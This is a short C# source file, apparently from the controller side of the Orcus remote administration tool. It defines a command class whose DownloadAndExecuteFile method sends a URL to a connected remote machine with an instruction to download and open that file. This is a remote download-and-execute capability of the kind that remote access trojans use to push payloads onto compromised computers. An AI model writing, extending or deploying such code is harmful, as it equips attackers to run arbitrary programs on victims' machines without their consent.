using System;
using System.Collections.Generic;
using System.Text;
using Orcus.Shared.Commands.Internet;

namespace Orcus.Administration.App
{
	public class InternetCommand : Command
	{
		public override void ResponseReceived (byte[] parameter)
		{
			//Ignored
		}

		public void DownloadAndExecuteFile(string url)
		{
			var package = new List<byte> {(byte) InternetCommunication.DownloadAndOpenFile};
			package.AddRange(Encoding.UTF8.GetBytes(url));
			ConnectionInfo.SendCommand(this, package.ToArray());
		}

		protected override uint GetId ()
		{
			return 10;
		}
	}
}